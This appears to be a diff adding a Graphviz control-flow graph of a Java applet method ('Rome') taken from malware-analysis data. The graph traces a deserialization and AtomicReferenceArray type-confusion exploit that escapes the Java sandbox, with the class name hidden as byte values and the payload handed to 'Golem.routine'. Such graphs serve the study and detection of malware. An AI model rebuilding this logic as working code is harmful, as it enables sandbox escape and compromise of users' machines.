@@ -1,0 +1,413 @@
+digraph "" {
+    "r0 := @this: Rome"
+    "load.r r0"
+    "r0 := @this: Rome"->"load.r r0";
+    "fieldget <Rome: byte[] bytes>"
+    "load.r r0"->"fieldget <Rome: byte[] bytes>";
+    "staticinvoke <Rome: void reverseAr(byte[])>"
+    "fieldget <Rome: byte[] bytes>"->"staticinvoke <Rome: void reverseAr(byte[])>";
+    "staticinvoke <Rome: void reverseAr(byte[])>"->"load.r r0";
+    "push \"debug\""
+    "load.r r0"->"push \"debug\"";
+    "virtualinvoke <Rome: java.lang.String getParameter(java.lang.String)>"
+    "push \"debug\""->"virtualinvoke <Rome: java.lang.String getParameter(java.lang.String)>";
+    "store.r r3"
+    "virtualinvoke <Rome: java.lang.String getParameter(java.lang.String)>"->"store.r r3";
+    "load.r r3"
+    "store.r r3"->"load.r r3";
+    "ifnull push \"init()\""
+    "load.r r3"->"ifnull push \"init()\"";
+    "push \"true\""
+    "ifnull push \"init()\""->"push \"true\"";
+    "push \"true\""->"load.r r3";
+    "virtualinvoke <java.lang.String: boolean equalsIgnoreCase(java.lang.String)>"
+    "load.r r3"->"virtualinvoke <java.lang.String: boolean equalsIgnoreCase(java.lang.String)>";
+    "ifeq push \"init()\""
+    "virtualinvoke <java.lang.String: boolean equalsIgnoreCase(java.lang.String)>"->"ifeq push \"init()\"";
+    "push 1"
+    "ifeq push \"init()\""->"push 1";
+    "staticput <Utils: boolean DEBUG_MODE>"
+    "push 1"->"staticput <Utils: boolean DEBUG_MODE>";
+    "push \"init()\""
+    "staticput <Utils: boolean DEBUG_MODE>"->"push \"init()\"";
+    "staticinvoke <Utils: void debug(java.lang.String)>"
+    "push \"init()\""->"staticinvoke <Utils: void debug(java.lang.String)>";
+    "new java.io.ObjectInputStream"
+    "staticinvoke <Utils: void debug(java.lang.String)>"->"new java.io.ObjectInputStream";
+    "dup1.r"
+    "new java.io.ObjectInputStream"->"dup1.r";
+    "new java.io.ByteArrayInputStream"
+    "dup1.r"->"new java.io.ByteArrayInputStream";
+    "new java.io.ByteArrayInputStream"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "load.r r0"->"fieldget <Rome: byte[] bytes>";
+    "specialinvoke <java.io.ByteArrayInputStream: void <init>(byte[])>"
+    "fieldget <Rome: byte[] bytes>"->"specialinvoke <java.io.ByteArrayInputStream: void <init>(byte[])>";
+    "specialinvoke <java.io.ObjectInputStream: void <init>(java.io.InputStream)>"
+    "specialinvoke <java.io.ByteArrayInputStream: void <init>(byte[])>"->"specialinvoke <java.io.ObjectInputStream: void <init>(java.io.InputStream)>";
+    "virtualinvoke <java.io.ObjectInputStream: java.lang.Object readObject()>"
+    "specialinvoke <java.io.ObjectInputStream: void <init>(java.io.InputStream)>"->"virtualinvoke <java.io.ObjectInputStream: java.lang.Object readObject()>";
+    "checkcast"
+    "virtualinvoke <java.io.ObjectInputStream: java.lang.Object readObject()>"->"checkcast";
+    "checkcast"->"checkcast";
+    "checkcast"->"dup1.r";
+    "push 0"
+    "dup1.r"->"push 0";
+    "arrayread.r"
+    "push 0"->"arrayread.r";
+    "arrayread.r"->"checkcast";
+    "checkcast"->"checkcast";
+    "checkcast"->"store.r r3";
+    "push 48"
+    "store.r r3"->"push 48";
+    "newarray"
+    "push 48"->"newarray";
+    "store.r r5"
+    "newarray"->"store.r r5";
+    "load.r r5"
+    "store.r r5"->"load.r r5";
+    "load.r r5"->"push 0";
+    "push 106"
+    "push 0"->"push 106";
+    "arraywrite.b"
+    "push 106"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "load.r r5"->"push 1";
+    "push 97"
+    "push 1"->"push 97";
+    "push 97"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 2"
+    "load.r r5"->"push 2";
+    "push 118"
+    "push 2"->"push 118";
+    "push 118"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 3"
+    "load.r r5"->"push 3";
+    "push 3"->"push 97";
+    "push 97"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 4"
+    "load.r r5"->"push 4";
+    "push 46"
+    "push 4"->"push 46";
+    "push 46"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 5"
+    "load.r r5"->"push 5";
+    "push 117"
+    "push 5"->"push 117";
+    "push 117"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 6"
+    "load.r r5"->"push 6";
+    "push 116"
+    "push 6"->"push 116";
+    "push 116"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 7"
+    "load.r r5"->"push 7";
+    "push 105"
+    "push 7"->"push 105";
+    "push 105"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 8"
+    "load.r r5"->"push 8";
+    "push 108"
+    "push 8"->"push 108";
+    "push 108"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 9"
+    "load.r r5"->"push 9";
+    "push 9"->"push 46";
+    "push 46"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 10"
+    "load.r r5"->"push 10";
+    "push 99"
+    "push 10"->"push 99";
+    "push 99"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 11"
+    "load.r r5"->"push 11";
+    "push 111"
+    "push 11"->"push 111";
+    "push 111"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 12"
+    "load.r r5"->"push 12";
+    "push 110"
+    "push 12"->"push 110";
+    "push 110"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 13"
+    "load.r r5"->"push 13";
+    "push 13"->"push 99";
+    "push 99"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 14"
+    "load.r r5"->"push 14";
+    "push 14"->"push 117";
+    "push 117"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 15"
+    "load.r r5"->"push 15";
+    "push 114"
+    "push 15"->"push 114";
+    "push 114"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 16"
+    "load.r r5"->"push 16";
+    "push 16"->"push 114";
+    "push 114"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 17"
+    "load.r r5"->"push 17";
+    "push 101"
+    "push 17"->"push 101";
+    "push 101"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 18"
+    "load.r r5"->"push 18";
+    "push 18"->"push 110";
+    "push 110"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 19"
+    "load.r r5"->"push 19";
+    "push 19"->"push 116";
+    "push 116"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 20"
+    "load.r r5"->"push 20";
+    "push 20"->"push 46";
+    "push 46"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 21"
+    "load.r r5"->"push 21";
+    "push 21"->"push 97";
+    "push 97"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 22"
+    "load.r r5"->"push 22";
+    "push 22"->"push 116";
+    "push 116"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 23"
+    "load.r r5"->"push 23";
+    "push 23"->"push 111";
+    "push 111"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 24"
+    "load.r r5"->"push 24";
+    "push 109"
+    "push 24"->"push 109";
+    "push 109"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 25"
+    "load.r r5"->"push 25";
+    "push 25"->"push 105";
+    "push 105"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 26"
+    "load.r r5"->"push 26";
+    "push 26"->"push 99";
+    "push 99"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 27"
+    "load.r r5"->"push 27";
+    "push 27"->"push 46";
+    "push 46"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 28"
+    "load.r r5"->"push 28";
+    "push 65"
+    "push 28"->"push 65";
+    "push 65"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 29"
+    "load.r r5"->"push 29";
+    "push 29"->"push 116";
+    "push 116"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 30"
+    "load.r r5"->"push 30";
+    "push 30"->"push 111";
+    "push 111"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 31"
+    "load.r r5"->"push 31";
+    "push 31"->"push 109";
+    "push 109"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 32"
+    "load.r r5"->"push 32";
+    "push 32"->"push 105";
+    "push 105"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 33"
+    "load.r r5"->"push 33";
+    "push 33"->"push 99";
+    "push 99"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 34"
+    "load.r r5"->"push 34";
+    "push 82"
+    "push 34"->"push 82";
+    "push 82"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 35"
+    "load.r r5"->"push 35";
+    "push 35"->"push 101";
+    "push 101"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 36"
+    "load.r r5"->"push 36";
+    "push 102"
+    "push 36"->"push 102";
+    "push 102"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 37"
+    "load.r r5"->"push 37";
+    "push 37"->"push 101";
+    "push 101"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 38"
+    "load.r r5"->"push 38";
+    "push 38"->"push 114";
+    "push 114"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 39"
+    "load.r r5"->"push 39";
+    "push 39"->"push 101";
+    "push 101"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 40"
+    "load.r r5"->"push 40";
+    "push 40"->"push 110";
+    "push 110"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 41"
+    "load.r r5"->"push 41";
+    "push 41"->"push 99";
+    "push 99"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 42"
+    "load.r r5"->"push 42";
+    "push 42"->"push 101";
+    "push 101"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 43"
+    "load.r r5"->"push 43";
+    "push 43"->"push 65";
+    "push 65"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 44"
+    "load.r r5"->"push 44";
+    "push 44"->"push 114";
+    "push 114"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 45"
+    "load.r r5"->"push 45";
+    "push 45"->"push 114";
+    "push 114"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "load.r r5"->"push 46";
+    "push 46"->"push 97";
+    "push 97"->"arraywrite.b";
+    "arraywrite.b"->"load.r r5";
+    "push 47"
+    "load.r r5"->"push 47";
+    "push 121"
+    "push 47"->"push 121";
+    "push 121"->"arraywrite.b";
+    "new java.lang.String"
+    "arraywrite.b"->"new java.lang.String";
+    "new java.lang.String"->"dup1.r";
+    "dup1.r"->"load.r r5";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"
+    "load.r r5"->"specialinvoke <java.lang.String: void <init>(byte[])>";
+    "staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>"
+    "specialinvoke <java.lang.String: void <init>(byte[])>"->"staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>";
+    "staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>"->"store.r r5";
+    "store.r r5"->"push 1";
+    "push 1"->"arrayread.r";
+    "store.r r6"
+    "arrayread.r"->"store.r r6";
+    "store.r r6"->"load.r r5";
+    "load.r r6"
+    "load.r r5"->"load.r r6";
+    "virtualinvoke <java.lang.Class: java.lang.Object cast(java.lang.Object)>"
+    "load.r r6"->"virtualinvoke <java.lang.Class: java.lang.Object cast(java.lang.Object)>";
+    "virtualinvoke <java.lang.Class: java.lang.Object cast(java.lang.Object)>"->"store.r r6";
+    "store.r r6"->"push 2";
+    "push 2"->"newarray";
+    "store.r $r24"
+    "newarray"->"store.r $r24";
+    "load.r $r24"
+    "store.r $r24"->"load.r $r24";
+    "load.r $r24"->"push 0";
+    "staticget <java.lang.Integer: java.lang.Class TYPE>"
+    "push 0"->"staticget <java.lang.Integer: java.lang.Class TYPE>";
+    "arraywrite.r"
+    "staticget <java.lang.Integer: java.lang.Class TYPE>"->"arraywrite.r";
+    "arraywrite.r"->"load.r $r24";
+    "load.r $r24"->"push 1";
+    "push class \"Ljava/lang/Object;\""
+    "push 1"->"push class \"Ljava/lang/Object;\"";
+    "push class \"Ljava/lang/Object;\""->"arraywrite.r";
+    "arraywrite.r"->"load.r r5";
+    "push \"set\""
+    "load.r r5"->"push \"set\"";
+    "push \"set\""->"load.r $r24";
+    "virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>"
+    "load.r $r24"->"virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>";
+    "virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>"->"push 2";
+    "push 2"->"newarray";
+    "newarray"->"store.r r5";
+    "store.r r5"->"load.r r5";
+    "load.r r5"->"push 0";
+    "push 0"->"push 0";
+    "staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>"
+    "push 0"->"staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>";
+    "staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>"->"arraywrite.r";
+    "arraywrite.r"->"load.r r5";
+    "load.r r5"->"push 1";
+    "push 1"->"load.r r0";
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"
+    "load.r r0"->"virtualinvoke <java.lang.Object: java.lang.Class getClass()>";
+    "virtualinvoke <java.lang.Class: java.lang.ClassLoader getClassLoader()>"
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"->"virtualinvoke <java.lang.Class: java.lang.ClassLoader getClassLoader()>";
+    "virtualinvoke <java.lang.Class: java.lang.ClassLoader getClassLoader()>"->"arraywrite.r";
+    "arraywrite.r"->"load.r r6";
+    "load.r r6"->"load.r r5";
+    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"
+    "load.r r5"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
+    "pop"
+    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"pop";
+    "push null"
+    "pop"->"push null";
+    "push null"->"load.r r3";
+    "load.r r3"->"push 0";
+    "push 0"->"arrayread.r";
+    "arrayread.r"->"push 1";
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "dup1.r"->"push 0";
+    "push 0"->"load.r r0";
+    "load.r r0"->"arraywrite.r";
+    "staticinvoke <Golem: void routine(java.lang.Object[],Golem,java.lang.Object[])>"
+    "arraywrite.r"->"staticinvoke <Golem: void routine(java.lang.Object[],Golem,java.lang.Object[])>";
+    "goto return"
+    "staticinvoke <Golem: void routine(java.lang.Object[],Golem,java.lang.Object[])>"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "staticinvoke <Golem: void routine(java.lang.Object[],Golem,java.lang.Object[])>"->"store.r r0";
+    "store.r r0"->"load.r r0";
+    "virtualinvoke <java.lang.Exception: java.lang.String getMessage()>"
+    "load.r r0"->"virtualinvoke <java.lang.Exception: java.lang.String getMessage()>";
+    "virtualinvoke <java.lang.Exception: java.lang.String getMessage()>"->"load.r r0";
+    "staticinvoke <Utils: void debug(java.lang.String,java.lang.Throwable)>"
+    "load.r r0"->"staticinvoke <Utils: void debug(java.lang.String,java.lang.Throwable)>";
+}
